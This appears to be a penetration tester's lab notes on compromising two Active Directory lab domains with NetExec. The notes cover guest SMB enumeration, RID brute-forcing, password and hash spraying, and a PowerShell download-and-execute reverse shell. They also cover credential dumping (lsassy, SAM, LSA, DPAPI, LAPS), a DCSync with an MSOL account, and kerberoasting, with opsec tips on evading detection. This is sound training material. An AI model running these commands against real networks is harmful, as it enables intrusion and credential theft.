- We start by checking smb for null and guest access to any shares
	- ![[Pasted image 20260225141001.png]]
- Next we use the spider_plus module from NetExec and find a file we can read.z
	- ![[Pasted image 20260225141153.png]]
- We can pull down the file with netexec as well :) 
	- ![[Pasted image 20260225141237.png]]
- After we open the file we find what looks to be a set of credentials. It doesn't really mention where to use them but we can try spraying them around next.
	- ![[Pasted image 20260225142742.png]]
- We check out the ftp server and see a file unlocked with the new creds
	- ![[Pasted image 20260225143040.png]]
- So at this point we've got a new password from the plans.txt file, but we don't know where to use it or which user it belongs to.
	- NEEDSCREENSHOT
- At this point we can take a step back and do some additional enumeration with that guest smb access.
	- `nxc smb --help` will show us a lot of different options but within Mapping/Enumeration we can start pulling some more information from this host and the domain environment.
	- ![[Pasted image 20260226115413.png]]
- `nxc smb ips.list -u ' ' -p '' --rid-brute 3000`
	- ![[Pasted image 20260226115317.png]]
- `nxc smb ips.list -u 'guest' -p '' --rid-brute 3000`
	- Note how our results get better when specifying 'guest' as the username on the other hosts.
	- Earlier we got a guest login to just one host by using a space for the username ' '
		- 
	- ![[Pasted image 20260226210518.png]]
- After doing some bashfu to get the output from the rid-brute in line, we find a user with local administrator privileges on the METRONUM host.
	- Extra interesting that "localix" appeared to be a local account from the REFERENDUM host...even though we're logging in to the METRONUM host...just going to save that info for later for now..
	- ![[Pasted image 20260226211028.png]]
- After we get a Pwn3d! signal we know we have RCE capabilities. 
	- With this in mind, we utilize a powershell reverse shell that we host with a quick python simple http server
	- `iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')`
	- ![[Pasted image 20260226212237.png]]
- Voila! We have our first reverse shell!
	- The big question is, do we even need a shell?

# Post Exploitation credential gathering
- At this point we have local admin privileges on a host. We can start dumping secrets and looking for additional user passwords and hashes to try moving laterally through the environment.
	- This does not need to be done on the machine itself.
	- This reduces our detection footprint by not performing any file writes on the host's local storage.

| **Option** | **Target Location**           | **What is retrieved?**                                                                                    | **Typical Use Case**                                                               | **Opsec**                                                                                                                                         |
| ---------- | ----------------------------- | --------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------- |
| -M lsassy  | Process memory of `lsass.exe` | Active user hashes, kereros tickets, plaintext.                                                           | Requires `SeDebugPrivilege`(local admin)                                           | Uses a legitimate DLL (comsvcs.dll) but can also use 'procdump'/'nanodump'                                                                        |
| `--sam`    | `HKLM\SAM`                    | Local user NTLM hashes.                                                                                   | Gaining local admin on other machines via credential reuse.                        | Noisy. Req enabling Remote Registry service, dumping the hive to a .tmp file in C:\windows\temp, download the file, delete the file...so much IOC |
| `--lsa`    | `HKLM\SECURITY`               | Service account passwords, cached domain credentials, machine accounts, and cleartext (if WDigest is on). | Finding service accounts or cleartext credentials for lateral movement.            | Noisy. Req enabling Remote Registry service, dumping the hive to a .tmp file in C:\windows\temp, download the file, delete the file...so much IOC |
| `--dpapi`  | User/System Blobs             | Master keys, browser passwords (Chrome/Edge), Wi-Fi keys, and Vault secrets.                              | Deep-dive data theft; useful for finding "human" passwords or web session cookies. |                                                                                                                                                   |
| `--ntds`   | `ntds.dit` (on DCs)           | **Every** hash in the entire Active Directory domain.                                                     | Total domain takeover (the "End Game").                                            |                                                                                                                                                   |
- When we dump credentials with `--sam` we gain a few hashes but it needs to be noted that the SAM is a database (really a registry hive) file located at `C:\Windows\System32\config\SAM` and it ONLY contains local accounts created specifically on this host.
	- These hashes persist after reboot because they are stored ON THIS MACHINE. 
		- For all the domain user activity, this computer just asks the DC if they're genuine or not without storing any of their credential info in the SAM database.
	- This gets useful for lateral movement when 
		1. LAPS is not enabled. Basically a GPO to enforce random local admin passwords. aka fck your SAM dump..:sadge:
		2. The organization has used a "golden image" to image multiple workstations across the environment using the same local admin username and password.
	- We try passing these around the network using the collected usernames using local auth as well as domain auth..
	- ![[Pasted image 20260227214535.png]]
- We do actually see one of these username:hashes is valid on another host...but we don't find anything else from credential dumping on that host unfortunately.
	- ![[Pasted image 20260227220704.png]]
- If we dump credentials with the `--lsa` option we are pulling from the currently stored session credential information. 
	- These credentials DO NOT persist after reboot. But it does include cached domain logins, kerberos tickets, and NTLM hashes. 
- NOTE: Use of the `-M lsassy` module is highly recommended.
	- This module is slightly less invasive than the normal --lsa method. Attempts to blend into normal Windows behavior to avoid detection/blocks.
	- Returns an NTLM hash that can be passed around with PTH.
	- ![[Pasted image 20260227221839.png]]

- With these new creds for musculus we can interrogate this host even more.
	- By dumping the dpapi secrets we can see another user's password.
	- ![[Pasted image 20260302205253.png]]
- Here's a better screen using the hash instead of cleartext password.
	- ![[Pasted image 20260310005036.png]]
- Now is a really good time for a bloodhound run
	- `nxc ldap 10.2.10.11 -u musculus -H 'c6f7c388039d669efc7bf167f1507e2b' --bloodhound -c all`
- Next we look for the outbound controls for the accounts we have access to.
	- The lapsus users appears to have the ability to read the LAPS password for a couple hosts.
	- ![[Pasted image 20260311152106.png]]
- This next step took me a good minute to actually figure out and it was only because i hadn't added any of the lab ip addresses to the /etc/hosts file for my attack machine.
	- That and the fact that there is no DNS in the lab...anywhoo.
	- PRO TIPS:
		1. **IPs are for SMB:** Great for initial spraying and quick checks.
		2. **Hostnames are for Everything Else:** LDAP, Kerberos, and WinRM often require proper name resolution to function correctly.
- With the lapsus user we start trying to use the --laps option to gather credentials with netexec
	- `nxc smb ips.list -u 'lapsus' -p 'hC78*K,Zv+z123' --laps`
	- ![[Pasted image 20260302220708.png]]
- We already looted the METRONUM host for all its secrets, so next we'll target REFERENDUM
	- `nxc smb 10.2.10.12 -u administrator -p admin.passes --local-auth -M lsassy`
	- ![[Pasted image 20260303073401.png]]
	- `nxc smb 10.2.10.12 -u administrator -p admin.passes --local-auth --dpapi`
	- ![[Pasted image 20260303073440.png]]
- Looks like we found an MSOL account with a really long password.
	- https://www.tevora.com/threat-blog/targeting-msol-accounts-to-compromise-internal-networks/
- With this MSOL account we typically have the ability to replicate domain information from on-prem to cloud
	- With this we can do a dcsync with `impacket-secretsdump`
	- 
	- ![[Pasted image 20260303094812.png]]
- With these hashes dumped from the rome.local domain we can try spraying them into the other domain.
- We initially try reusing the same list of usernames with these hashes while targeting the armorique.local domain machine.
- In order to be more effective in targeting the armorique.local domain we need to get some usernames that actually correspond to this domain.
	- Worth noting here that an empty username ex: `-u ' '` as well as `-u 'guest'` both fail but a null session `-u ''` is actually honored on this host
	- Then by adding on the `--users` option we can dump a list of all local users that have logged in here.
	- ![[Pasted image 20260303160533.png]]
- With a fresh list of usernames we start spraying with a combination of these usernames and the hashes we were able to dump from the other domain.
	- This is essentially looking for someone in both domains reusing the same password.
	- ![[Pasted image 20260303161151.png]]
	- ![[Pasted image 20260303193540.png]]
- Now that we have a set of valid credentials on the new domain it's time to start doing some more domain enumeration with these new credentials.
	- 
	- ![[Pasted image 20260303173624.png]]
- With this kerberoastable hash is crackable with hashcat
	- ![[Pasted image 20260303174306.png]]
	- ![[Pasted image 20260303174319.png]]